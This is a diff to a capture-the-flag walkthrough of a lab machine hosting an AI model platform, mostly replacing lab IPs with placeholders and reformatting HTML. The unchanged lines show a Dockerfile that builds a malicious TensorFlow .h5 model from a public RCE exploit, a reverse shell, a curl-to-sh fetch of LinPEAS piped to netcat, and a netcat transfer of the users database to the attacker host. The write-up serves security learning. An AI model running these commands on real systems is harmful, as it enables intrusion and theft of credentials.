@@ -18,7 +18,7 @@ Artificial is a Linux machine hosting an AI model management platform vulnerable
 We start by scanning the target with nmap:
 
 ```bash
-nmap -sV -v 10.10.11.74
+nmap -sV -v 100.100.100.100
 ```
 
 Results:
@@ -153,24 +153,41 @@ Examining the dashboard HTML reveals the application's functionality:
 
 ```html
 <main>
-    <section class="dashboard-section">
-        <h2>Your Models</h2>
-        <p style="color: black;">Upload, manage, and run your AI models here.</p>
+  <section class="dashboard-section">
+    <h2>Your Models</h2>
+    <p style="color: black;">Upload, manage, and run your AI models here.</p>
 
-        <!-- Warning message for TensorFlow version -->
-        <p class="version-warning">Please ensure these <a href="/static/requirements.txt">requirements</a> are installed when building your model, or use our <a href="/static/Dockerfile">Dockerfile</a> to build the needed environment with ease.  </p>
+    <!-- Warning message for TensorFlow version -->
+    <p class="version-warning">
+      Please ensure these
+      <a href="/static/requirements.txt">requirements</a> are installed when
+      building your model, or use our
+      <a href="/static/Dockerfile">Dockerfile</a> to build the needed
+      environment with ease.
+    </p>
 
-        <!-- Upload form -->
-        <form id="upload-form" enctype="multipart/form-data" action="/upload_model" method="POST">
-            <input type="file" name="model_file" accept=".h5" class="file-input" required="">
-            <button type="submit" class="btn" style="color: white;">Upload Model</button>
-        </form>
+    <!-- Upload form -->
+    <form
+      id="upload-form"
+      enctype="multipart/form-data"
+      action="/upload_model"
+      method="POST"
+    >
+      <input
+        type="file"
+        name="model_file"
+        accept=".h5"
+        class="file-input"
+        required=""
+      />
+      <button type="submit" class="btn" style="color: white;">
+        Upload Model
+      </button>
+    </form>
 
-        <!-- List models -->
-        <ul class="model-list">
-
-        </ul>
-    </section>
+    <!-- List models -->
+    <ul class="model-list"></ul>
+  </section>
 </main>
 ```
 
@@ -272,7 +289,7 @@ RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinu
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
 # Replace the attacker IP and port
-RUN sed -i 's/127.0.0.1/10.10.14.9/g' exploit.py && sed -i 's/6666/4444/g' exploit.py
+RUN sed -i 's/127.0.0.1/10.10.10.10/g' exploit.py && sed -i 's/6666/4444/g' exploit.py
 
 # Generate the malicious h5 model file containing the payload
 RUN python exploit.py
@@ -360,7 +377,7 @@ Connection: keep-alive
 The payload executes successfully, and we receive a connection:
 
 ```bash
-connect to [10.10.14.9] from (UNKNOWN) [10.10.11.74] 56218
+connect to [10.10.10.10] from (UNKNOWN) [100.100.100.100] 56218
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami && pwd && ls -la
 app
@@ -403,7 +420,7 @@ Then transfer and execute LinPEAS on the target, sending output to our machine:
 
 ```bash
 nc -lvnp 9999 > linpeas.out # My machine
-curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999 # Remote box
+curl 10.10.10.10:8888/linpeas.sh | sh | nc 10.10.10.10 9999 # Remote box
 ```
 
 ### Key Findings
@@ -432,7 +449,7 @@ uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
 uid=1001(app) gid=1001(app) groups=1001(app)
 
 ══╣ Logged in users (utmp)
-gael     + pts/0        2025-08-15 13:48 06:00        6094 (10.10.14.4)
+gael     + pts/0        2025-08-15 13:48 06:00        6094 (10.10.10.10)
 
 ╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
 lrwxrwxrwx 1 root root 34 Jun  2 07:38 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
@@ -491,7 +508,7 @@ We transfer the database file to our machine using netcat:
 
 ```bash
 nc -lvp 9999 > users.db # My machine
-cat /home/app/app/instance/users.db | nc 10.10.14.9 9999 # Remote box
+cat /home/app/app/instance/users.db | nc 10.10.10.10 9999 # Remote box
 ```
 
 ### Examining the Database
